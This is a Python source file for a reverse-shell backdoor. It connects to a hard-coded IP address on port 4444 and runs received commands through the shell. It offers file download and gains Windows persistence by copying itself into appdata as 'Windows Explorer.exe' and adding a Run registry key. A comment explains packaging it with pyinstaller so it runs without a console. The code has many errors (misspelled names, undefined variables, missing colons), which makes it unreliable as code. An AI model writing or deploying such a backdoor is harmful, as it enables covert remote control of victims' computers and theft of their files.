#!/usr/bin/env python 
import socket 
import subprocess
import json
import os



class Backdoor:
    def __init__(self,ip,port):
	self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    def execute_command(command):
        return subprocess.check_output(command, shell = True)

    def become_persistent(self):	
	loc = os.environ["appdata"] + "\\Windows Explorer.exe"
	shutil.copyfile(sys.executable, evil_file_loc)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update REG_SZ /d"' + loc + '"'  , shell=Ture)
    
    def relible_send(self , data):
        json_data = json.dumps(data)
        self.connection.sned(json_data)
    
    def relible_recieve(self):
        json_data = " " 
        while True: 
            try:
                json_data = self.connection(command)
                return self.connection.recv(1024)
            except ValueError:
                continue
        
    def run(self):
        while True:
            command = self.reliable_recieve()
            if command[0] == "exit" 
                self.connection.close()
                exit()
            elif command[0] == "cd" and length(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download"
                command_result = self.read_file(command[1])
            else:
                result = self.execute_remotely(command)


#Execute without terminal in background  and - in terminal - pyinstaller (name of file)(if using linux, use wine and the other commands)  --onefile --noconsole
def execute_system_command(self,command):
	DEVNULL = open(os.devnull, 'w')
	return subprocess.check_output(command, shell=Ture, stderr=subprocess.DEVNULL , stdin=subprocess.DEVNULL)
            

my_backdoor = Backdoor("9.246.94.31" , 4444)
my_backdoor.run()

#subprocess.Popen - works in the back while .call works 
